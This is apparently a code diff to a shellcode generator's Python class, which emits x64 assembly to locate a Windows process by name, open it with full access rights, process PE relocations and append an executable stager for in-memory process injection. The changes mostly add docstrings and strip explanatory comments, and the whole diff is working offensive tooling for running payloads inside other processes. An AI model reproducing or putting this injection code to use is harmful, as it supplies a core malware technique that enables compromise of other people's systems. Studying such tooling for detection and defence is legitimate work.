@@ -130,6 +130,8 @@ class Shellcode():
         return
 
     def set_args(self):
+        """Parse user arguments and set default settings where appropriate
+        """
 
         argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
@@ -140,7 +142,9 @@ class Shellcode():
         if self.exe_stager == None:
             exit(-1)
 
-        # If we are injecting into a remote process
+        # If we are injecting into a remote process we will need different API's
+        # than if we are injecting into the target process. So, we only resolve
+        # API's that are important to a given technique.
         if "PROCESS" not in argv_dict.keys():
             self.process = None
             self.dependencies["Kernel32.dll"] += "WaitForSingleObject",
@@ -656,9 +660,9 @@ get_dwTableSize:
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
     imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
-    xor rcx, rcx                                                   ; ^
-    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]     ; |
-    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx         ; Looks good
+    xor rcx, rcx
+    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
+    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx
 
 get_pBaseRelocationTable:
     mov rcx, [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
@@ -745,10 +749,13 @@ no_reloc:
         return stub
 
     def get_pid_of(self, target_proc):
-        
+        """Obtains the PID of a target process
+
+        :param target_proc: The name of the target process to inject into
+        :type target_proc: str
+        """
+
         stub = f"""
-; RAX => CreateToolhelp32Snapshot(CreateToolhelp32Snapshot([in] DWORD dwFlags,        // RCX
-;                                                          [in] DWORD th32ProcessID); // RDX
 take_snap:
     mov rcx, {tlhelp32.TH32CS_SNAPPROCESS}
     xor rdx, rdx
@@ -757,16 +764,14 @@ take_snap:
     mov [rbp - {self.storage_offsets['hSnapshot']}], rax
 
 setup_PROCESSENTRY32:
-    lea rbx, [rbp - {self.storage_offsets['ProcessEntry']}]        ; PROCESSENTRY32 ProcessEntry;
+    lea rbx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    mov rdi, rbx
+    xor rax, rax
+    mov rcx, {int(ctypes.sizeof(tlhelp32._PROCESSENTRY32)/8)}
+    rep stosq
 
-    mov rdi, rbx                                                   ; RDI holds the address we're going to zero out (PROCESSENTRY32 structure)
-    xor rax, rax                                                   ; Zero out (RAX == 0x00)
-    mov rcx, {int(ctypes.sizeof(tlhelp32._PROCESSENTRY32)/8)}      ; 0x26 * sizeof(RAX) == sizeof(PROCESSENTRY32)
-    rep stosq                                                      ; "memset(ProcessEntry, 0x00, sizeof(PROCESSENTRY32))"
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}
 
-    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)} ; ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
-
-; if (Process32First(hSnapshot, &ProcessEntry)) {{
 find_proc:
     mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
     lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
@@ -778,15 +783,6 @@ check_proc:
     add rdx, {tlhelp32._PROCESSENTRY32.szExeFile.offset}
     xor rcx, rcx
 
-;     do {{
-;         if (ProcessEntry.szExeFile[0] == 'e' &&
-;             ProcessEntry.szExeFile[1] == 'x' &&
-;             ProcessEntry.szExeFile[2] == 'p' &&
-;             ProcessEntry.szExeFile[3] == 'l' &&
-;             ProcessEntry.szExeFile[4] == 'o' &&
-;             ProcessEntry.szExeFile[5] == 'r' &&
-;             ProcessEntry.szExeFile[6] == 'e' &&
-;             ProcessEntry.szExeFile[7] == 'r') {{
 begin_check:"""
 
         for i in range(len(target_proc) - 1):
@@ -799,18 +795,15 @@ begin_check:"""
     cmp byte ptr [rdx + {len(target_proc) - 1}], {hex(ord(target_proc[len(target_proc)-1]))}
     je get_pid
 
-;     }} while (Process32Next(hSnapshot, &ProcessEntry));
 next_proc_entry:
     mov rax, [rbp - {self.storage_offsets["Process32Next"]}]
     mov rcx, [rbp - {self.storage_offsets["hSnapshot"]}]
     lea rdx, [rbp - {self.storage_offsets["ProcessEntry"]}]
-    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)} ; ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}
     call rax
     test rax, rax
     jnz check_proc
-;
-;             pid = ProcessEntry.th32ProcessID;
-;         }}
+
 get_pid: 
     xor rax, rax
     lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
@@ -818,7 +811,6 @@ get_pid:
     mov eax, [rdx]
     mov [rbp - {self.storage_offsets['pid']}], rax
 
-; RAX => CloseHandle([in] HANDLE hObject); // RCX => hSnapshot
 call_CloseHandle:
     mov rax, [rbp - {self.storage_offsets['CloseHandle']}]
     mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
@@ -834,12 +826,9 @@ call_CloseHandle:
         if (self.process != None):
             stub = self.get_pid_of(self.process)
             stub += f"""
-; RAX => OpenProcess([in] DWORD dwDesiredAccess, // RCX => 0x001F0FFF
-;                    [in] BOOL  bInheritHandle,  // RDX => FALSE
-;                    [in] DWORD dwProcessId);    // R8  => pid
 call_OpenProcess:
     mov rax, [rbp - {self.storage_offsets['OpenProcess']}]
-    mov rcx, 0x001F0FFF
+    mov rcx, {winnt.PROCESS_ALL_ACCESS}
     xor rdx, rdx
     mov r8, [rbp - {self.storage_offsets['pid']}]
     call rax
@@ -935,9 +924,8 @@ call_WaitForSingleObject:
         main_src = self.gen_main()
         src = win_stubs.gen_source(main_src)
         src += self.rva_to_offset()
-        src += """
-exe_file:
-"""
+        src += "exe_file:\n"
+
         shellcode = generator.get_bytes_from_asm(src)
         shellcode += self.exe_stager
 
